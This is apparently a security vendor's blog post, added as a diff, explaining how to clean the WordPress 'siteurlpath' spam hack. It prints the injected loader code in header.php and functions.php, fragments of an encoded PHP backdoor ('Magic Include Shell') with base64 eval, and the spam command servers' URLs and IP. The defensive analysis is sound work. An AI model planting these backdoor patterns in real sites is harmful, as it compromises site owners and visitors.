@@ -1,0 +1,91 @@
+Cleaning the “siteurlpath” hack on WordPress (wplinksforwork and hemoviestube spam bots)
+
+Recently we started to see a lot of WordPress sites hacked with malware hidden inside the wp_options -> siteurlpath table. The symptoms are very similar to the pharma hack (lots of SPAM hidden in the site), but in this case the SPAM is displayed to all users, not only search engines.
+This is how an affected site looks like on our scanner:
+
+Plus, all the sites infected receive “orders” (the spam links to display) from two sites: https://wplinksforwork.com and https://hemoviestube.com. Details about it later.
+To get started cleaning your site, you first have to make sure WordPress is updated. If it is not, go ahead and update it before doing anything else.
+Cleaning up the file system
+The first place you have to clean is the file system. On all the sites we’ve cleaned so far, the malware was hidden in three files: header.php, functions.php and a random image file (void.jpg, test.jpg, lol.jpg, etc). All of them are inside your themes directory.
+Inside the header.php, they added the following code:
+
+$wp__theme_icon=create_function(”,file_get_contents(‘/path/wp-content/themes/themename/images/void.jpg’));$wp__theme_icon(); ?>
+
+So it basically read the contents of void.jpg (which is not an image in reality, but a heavily encoded php backdoor):
+
+$ZKb9g9=”x2f50x2e5150x2ex29″;$fF6B=”3YlJXYlR2X1Zmb0NWau9″;
+$SH212J0g=’4x1ht1teJO+fIjr8RQGoOWFtXuBDqxzCadjGO9EcjVvq69bPPU14buBtN0d..
+NEO6FzZWtSyGGW/FTBs0n/NTHDdcUzlmNU4lK9dkHkXDt/ZRN59cABTSNAtMP16vXW..
+GWDBPxfz0Hemun9U1KfDzN+90qDvameU4y+OhbDXgYZxWNC8bsfHoRJ+yvbxy…
+… lots and lots more…
+
+Inside the functions.php, at the very bottom, the following code was added to load the siteurlpath option from the database where the spam itself is hidden:
+
+if(!isset($siteurlpath)&& @get_option(‘siteurlpath’)){
+$siteurlpath=create_function(”,(get_option(‘siteurlpath’)));
+$siteurlpath();
+}
+
+So removing these 3 files should clean the file system for this kind of hack.
+Cleaning up the database
+Run the following query to see if your database is infected:
+
+> select * from wp_options where option_name = ‘siteurlpath’;
+
+If you see a large spill of php code in there, it means the db is infected.
+
+if (!defined(‘WP_RAND_CUSTOM_CT_KTT’)){
+@error_reporting (0);
+define(‘WP_RAND_CUSTOM_CT_KTT’,’boom’);
+if (function_exists(‘remove_filter’)){
+remove_filter(‘pre_user_first_name’,’sanitize_text_field’);
+remove_filter(‘pre_user_first_name’,’wp_filter_kses’);
+remove_filter(‘pre_user_first_name’,’_wp_specialchars’,30);
+remove_filter(‘user_first_name’,’sanitize_text_field’);
+remove_filter(‘user_first_name’,’wp_filter_kses’);
+remove_filter(‘user_first_name’,’_wp_specialchars’,30);
+remove_filter(‘user_first_name’,’wp_kses_data’);
+}
+$md5_name_cookie_shell=’f731599f55e732de772d9451dbd705a0′;//792797d03dce
+0fb6ce8004a506bb3577
+$md5_cookie_shell=’792797d03dce0fb6ce8004a506bb3577′;//f731599f55e732de7
+72d9451dbd705a0
+$local_param=false;
+..
+if ($local_param){
+eval(base64_decode(‘Ci8qTWFnaWMgSW5jbHVkZSBTaGVsbCBieSBNYWcgaWNx
+IDg4NDg4OCovCiAgICAgIC8qRnJvbSBSdXNzaWEgV2l0aCBMb3ZlKi8KZXJyb3JfcmVwb3J0aW5nKDAp
+OwokZmV3ZXdmd2VmZXdmd2U9dHJ1ZTsKJGl0ZW1zX3Blcl9wYWdlID0gNTA7CmlmKCRmZXdld2Z3ZWZl
+d2Z3ZSl7CmNsYXNzIHppcGZpbGUgCnsgCiAg…
+This code basically acts as a backdoor for the attackers and print the SPAM to everyone else. This is the beginning of the backdoor (Magic shell):
+
+/*Magic Include Shell by Mag icq 884888*/
+/*From Russia With Love*/
+error_reporting(0);
+$fewewfwefewfwe=true;
+$items_per_page = 50;
+if($fewewfwefewfwe){
+class zipfile
+..
+
+As far as the spam, it loads them from two sites: https://wplinksforwork.com and https://hemoviestube.com.
+
+a:2:{i:0;s:56:”https://wplinksforwork.com/561327853624756347509328/p.php”;
+i:1;s:54:”https://hemoviestube.com/561327853624756347509328/p.php”;}
+
+The code is full of protection to avoid getting detected and acts as a PHP bot to infect other sites. Both sites used to manage the SPAM bots point to the same IP address and we recommend hosting companies to block them:
+
+# host hemoviestube.com
+hemoviestube.com has address 95.168.177.94
+# host wplinksforwork.com
+wplinksforwork.com has address 95.168.177.94
+
+You can see the scale of this attack by searching for these two sites on Google. You will see lots of sites generating errors when they were not able to reach the spam managers.
+
+Warning: file_get_contents(https://wplinksforwork.com/561327853624756347509328/p.php?
+[function.file-get-contents]: failed to …..
+
+We will post more details later about this attack, but this should be enough to clean up the affected sites.
+
+If your site is hacked (or contains malware), and you need help, send us an email at support@sucuri.net or visit our site: Sucuri Security Malware Removal. We can get your sites cleaned up right away.
+Also, consider checking out our site security monitoring. We will monitor your sites 24×7 and alert you if it ever gets infected with malware, hacked or blacklisted.
